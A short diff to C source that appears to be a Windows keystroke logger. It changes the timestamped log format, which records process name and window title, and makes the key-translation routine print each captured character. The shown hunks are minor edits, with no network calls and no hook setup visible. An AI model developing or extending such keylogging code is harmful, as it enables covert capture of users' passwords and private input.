@@ -159,7 +159,7 @@ static void write_to_log(const char* str)
         struct tm tm = *localtime(&t);
 
         // Write a new entry to the log file with the timestamp, process name, and window title
-        fprintf(g_logfile, "\n[%04d-%02d-%02d %02d:%02d:%02d] (%s) %s\n",
+        fprintf(g_logfile, "\n>>> %04d-%02d-%02d %02d:%02d:%02d (%s) %s\n",
             tm.tm_year + 1900,   // Year (add 1900 to get the full year)
             tm.tm_mon + 1,       // Month (tm_mon is 0-based, so add 1)
             tm.tm_mday,          // Day of the month
@@ -246,6 +246,8 @@ static const char* get_character(DWORD vkCode, DWORD scanCode, BYTE* keyboardSta
             // If neither Shift nor Caps Lock is active, ensure the character is lowercase.
             key[0] = (char)tolower(key[0]);
         }
+		key[1] = '\0';  // Null-terminate the string.
+		printf("%s\n", key);
     }
     else {
         // If ToUnicodeEx did not return exactly one character, return a placeholder for an unknown key.
